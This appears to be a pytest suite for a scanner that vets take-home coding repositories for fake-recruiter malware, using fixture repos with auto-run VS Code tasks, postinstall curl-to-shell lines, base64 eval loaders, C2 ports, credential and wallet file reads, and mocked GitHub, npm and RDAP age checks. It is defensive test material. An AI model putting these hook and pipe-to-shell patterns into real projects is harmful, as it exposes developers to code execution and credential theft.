"""Pre-check: each static tripwire on a tiny fixture repo, and network checks that fail soft. No real network.

  python -m pytest tests/test_precheck.py
"""
import base64
import datetime as dt
import json
import sys
import time
import urllib.error
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
from burner.control import precheck  # noqa: E402


@pytest.fixture(autouse=True)
def offline(monkeypatch):
    def nope(*a, **k):
        raise AssertionError("tests must not touch the network")
    monkeypatch.setattr(precheck, "fetch_json", nope)


def make(tmp_path, files):
    for name, text in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
    return tmp_path


def ids(flags):
    return {f["id"]: f for f in flags}


def check(tmp_path, files):
    return ids(precheck.static_flags(make(tmp_path, files)))


def test_vscode_folderopen_with_comments_and_os_keys(tmp_path):
    f = check(tmp_path, {".vscode/tasks.json": """{
      // looks harmless
      "version": "2.0.0",
      "tasks": [{"label": "setup", "type": "shell", "command": "node",
                 "args": ["./.vscode/settings.cache.js"],
                 "windows": {"command": "powershell -w hidden -c iwr x"},
                 "runOptions": {"runOn": "folderOpen"},},]
    }"""})
    fl = f["vscode-folderopen"]
    assert fl["severity"] == "high"
    assert "node ./.vscode/settings.cache.js" in fl["detail"] and "powershell" in fl["detail"]


def test_vscode_task_without_folderopen_is_quiet(tmp_path):
    f = check(tmp_path, {".vscode/tasks.json": '{"tasks": [{"label": "build", "command": "npm run build"}]}'})
    assert "vscode-folderopen" not in f


def test_lifecycle_scripts(tmp_path):
    f = check(tmp_path, {"package.json": json.dumps({"scripts": {
        "postinstall": "curl -s http://x.example/a.sh | sh", "start": "node index.js"}})})
    assert f["lifecycle-script"]["severity"] == "high"
    assert "postinstall" in f["lifecycle-script"]["detail"]


def test_benign_prepare_is_info(tmp_path):
    f = check(tmp_path, {"package.json": json.dumps({"scripts": {"prepare": "husky install"}})})
    assert f["lifecycle-script"]["severity"] == "info"


def test_git_hooks_and_hookspath(tmp_path):
    f = check(tmp_path, {".husky/pre-commit": "npx lint-staged\n",
                         "scripts/setup.js": "require('child_process').execSync('git config core.hooksPath .hooks')"})
    assert f["git-hooks"]["severity"] == "info"
    assert f["hookspath"]["severity"] == "warn"


def test_obfuscation_in_config_file_is_high(tmp_path):
    blob = base64.b64encode(b"x" * 400).decode()
    f = check(tmp_path, {"config/index.js": f'const p = "{blob}"; eval(Buffer.from(p, "base64").toString());'})
    assert f["obfuscation"]["severity"] == "high"
    assert "eval(" in f["obfuscation"]["detail"] and "base64 blob" in f["obfuscation"]["detail"]


def test_hex_escapes_and_obfuscator_names(tmp_path):
    code = "var " + ",".join(f"_0x{i:04x}=1" for i in range(12)) + ";var s='" + "\\x41" * 80 + "';"
    f = check(tmp_path, {"src/app.js": code})
    assert "obfuscation" in f and "_0x" in f["obfuscation"]["detail"] and "\\x escapes" in f["obfuscation"]["detail"]


def test_minified_vendor_file_not_flagged(tmp_path):
    f = check(tmp_path, {"public/jquery.min.js": "eval(atob('" + "A" * 300 + "'))"})
    assert "obfuscation" not in f


def test_base64_hidden_address_ip_and_c2_port(tmp_path):
    enc = base64.b64encode(b"198.51.100.7").decode()
    f = check(tmp_path, {"lib/telemetry.js": f'const h = Buffer.from("{enc}", "base64").toString();\n'
                                             'http.request({host: h, port: 1244});\n'
                                             'fetch("http://45.61.1.2:8080/x")'})
    assert "198.51.100.7" in f["hidden-address"]["detail"]
    assert f["c2-port"]["severity"] == "high" and "1244" in f["c2-port"]["title"]
    assert "45.61.1.2" in f["raw-ip"]["detail"]


def test_private_ips_and_versions_are_ignored(tmp_path):
    f = check(tmp_path, {"src/a.js": 'listen("127.0.0.1"); const lan = "192.168.1.10"; const v = "version 1.2.3.4";'})
    assert "raw-ip" not in f


def test_child_process_and_pipe_to_shell(tmp_path):
    f = check(tmp_path, {"src/a.js": "const cp = require('child_process'); cp.exec('ls');",
                         "install.sh": "curl -fsSL https://get.example/x | bash\n"})
    assert f["child-process"]["severity"] == "info"
    assert f["pipe-to-shell"]["severity"] == "high"


def test_child_process_running_curl_is_high(tmp_path):
    f = check(tmp_path, {"src/a.js": "const {exec} = require('node:child_process'); exec(\"curl -s http://x | sh\");"})
    assert f["child-process-net"]["severity"] == "high"


def test_committed_env(tmp_path):
    f = check(tmp_path, {".env": "PORT=3000\n", ".env.example": "API=https://collector.evil.example.net/x\n"})
    assert f["env-committed"]["severity"] == "info"
    f2 = ids(precheck.static_flags(make(tmp_path / "b", {".env": "AWS_SECRET_ACCESS_KEY=abc\n"})))
    assert f2["env-committed"]["severity"] == "warn"


def test_local_and_url_deps_and_typosquat(tmp_path):
    f = check(tmp_path, {"package.json": json.dumps({"dependencies": {
        "helper": "file:./vendor/helper", "thing": "git+https://github.com/x/y.git", "expresss": "^4.0.0",
        "axois": "1.0.0", "express": "^4", "preact": "^10"}})})
    assert "helper" in f["local-dep"]["detail"]
    assert "thing" in f["url-dep"]["detail"]
    assert "expresss" in f["typosquat"]["detail"] and "axois" in f["typosquat"]["detail"]
    assert "preact" not in f["typosquat"]["detail"]


def test_credential_paths(tmp_path):
    f = check(tmp_path, {"src/a.js": 'read(path.join(home, ".config/solana/id.json")); read(".aws/credentials")'})
    assert f["credential-paths"]["severity"] == "high"


def test_svg_with_script(tmp_path):
    f = check(tmp_path, {"assets/logo.svg": '<svg><script>fetch("x")</script></svg>'})
    assert f["svg-script"]["severity"] == "warn"


def test_node_modules_and_git_are_skipped(tmp_path):
    f = check(tmp_path, {"node_modules/x/index.js": "eval(atob('" + "A" * 300 + "'))",
                         ".git/hooks/post-checkout": "curl x | sh",
                         "index.js": "console.log('hi')"})
    assert f == {}


def test_clean_repo_has_no_flags(tmp_path):
    f = check(tmp_path, {"package.json": json.dumps({"scripts": {"start": "node index.js", "test": "node t.js"},
                                                     "dependencies": {"express": "^4"}}),
                         "index.js": "const express = require('express'); express().listen(3000);"})
    assert f == {}


def test_shipped_samples():
    bad = ids(precheck.static_flags(ROOT / "samples" / "fake-takehome"))
    assert {"hidden-address", "c2-port", "credential-paths", "obfuscation"} <= set(bad)
    clean = precheck.static_flags(ROOT / "samples" / "clean-takehome")
    assert all(f["severity"] == "info" for f in clean)


# ------------------------------------------------------------------------------------------------ network
def iso(days_ago):
    return (dt.datetime.now(dt.timezone.utc) - dt.timedelta(days=days_ago)).isoformat().replace("+00:00", "Z")


def test_network_signals(monkeypatch, tmp_path):
    repo = make(tmp_path, {"package.json": json.dumps({"dependencies": {"express": "^4", "brand-new-pkg": "^1"}})})

    def fake(url, timeout=3.0, headers=None, max_bytes=0):
        if url.endswith("/users/someone"):
            return {"created_at": iso(10), "public_repos": 1, "followers": 0, "type": "User"}, {}
        if url.endswith("/repos/someone/takehome"):
            return {"created_at": iso(3), "pushed_at": iso(1), "stargazers_count": 0}, {}
        if "/commits?per_page=1" in url:
            return [{}], {"Link": '<https://api.github.com/x?per_page=1&page=2>; rel="next", '
                                  '<https://api.github.com/x?per_page=1&page=2>; rel="last"'}
        if "downloads/point" in url:
            return {"express": {"downloads": 30_000_000}, "brand-new-pkg": {"downloads": 12}}, {}
        if url.endswith("/brand-new-pkg"):
            return {"time": {"created": iso(5)}}, {}
        if "rdap.org/domain/lumina-ledger.io" in url:
            return {"events": [{"eventAction": "registration", "eventDate": iso(20)}]}, {}
        raise AssertionError("unexpected " + url)
    monkeypatch.setattr(precheck, "fetch_json", fake)
    pc = precheck.run(repo, url="https://github.com/someone/takehome",
                      message="Hi, I'm Dan from Lumina (dan@lumina-ledger.io). Let's talk on t.me/dan")
    f = ids(pc["flags"])
    assert f["gh-new-account"]["severity"] == "high"
    assert f["gh-new-repo"]["severity"] == "warn" and "2 commits" in f["gh-new-repo"]["detail"]
    assert "brand-new-pkg" in f["npm-new-package"]["detail"] and "express" not in f["npm-new-package"]["detail"]
    assert f["domain-new"]["severity"] == "high" and "lumina-ledger.io" in f["domain-new"]["detail"]
    assert pc["sources"] == {"files": "ok", "github": "ok", "npm": "ok", "rdap": "ok"}
    assert pc["counts"]["high"] >= 2 and pc["note"].startswith("Pre-check")
    sev = [x["severity"] for x in pc["flags"]]
    assert sev == sorted(sev, key=precheck.SEV_ORDER.get)


def test_network_down_fails_soft(monkeypatch, tmp_path):
    repo = make(tmp_path, {"package.json": json.dumps({"dependencies": {"left-pad": "^1"}})})

    def down(*a, **k):
        raise urllib.error.URLError("network unreachable")
    monkeypatch.setattr(precheck, "fetch_json", down)
    pc = precheck.run(repo, url="https://github.com/a/b", message="mail me at x@newco-hiring.com")
    f = ids(pc["flags"])
    assert "gh-unavailable" in f and "domain-unavailable" in f
    assert all(x["severity"] == "info" for x in pc["flags"])
    assert pc["sources"]["github"] == "error"


def test_network_is_time_bounded(monkeypatch, tmp_path):
    repo = make(tmp_path, {"index.js": "1"})

    def slow(*a, **k):
        time.sleep(3)
        raise TimeoutError("slow")
    monkeypatch.setattr(precheck, "fetch_json", slow)
    t0 = time.time()
    pc = precheck.run(repo, url="https://github.com/a/b", budget=0.5)
    assert time.time() - t0 < 2
    assert pc["sources"]["github"] == "timeout"


def test_non_github_hosts_get_no_account_check(monkeypatch, tmp_path):
    repo = make(tmp_path, {"index.js": "1"})
    pc = precheck.run(repo, url="https://gitlab.com/a/b")   # fetch_json would raise AssertionError
    assert pc["sources"]["github"] == "skipped" and pc["flags"] == []


def test_message_domain():
    assert precheck.message_domain("write to jobs@talent.acme-capital.com") == "acme-capital.com"
    assert precheck.message_domain("see https://github.com/x/y and gmail.com") is None
    assert precheck.message_domain("visit www.shop.co.uk today") == "shop.co.uk"


def test_scan_emits_precheck_event_with_data(tmp_path):
    from burner.control import scan
    repo = make(tmp_path, {"index.js": "eval(atob('" + "A" * 300 + "'))"})
    got = []
    get = scan.start_precheck(repo, None, None, lambda stage, text, data=None: got.append((stage, text, data)))
    pc = get()
    assert got and got[0][0] == "precheck" and got[0][2] is pc
    assert "warnings only" in got[0][1]
    old = []
    scan.start_precheck(repo, None, None, lambda stage, text: old.append((stage, text)))()
    assert old and old[0][0] == "precheck"
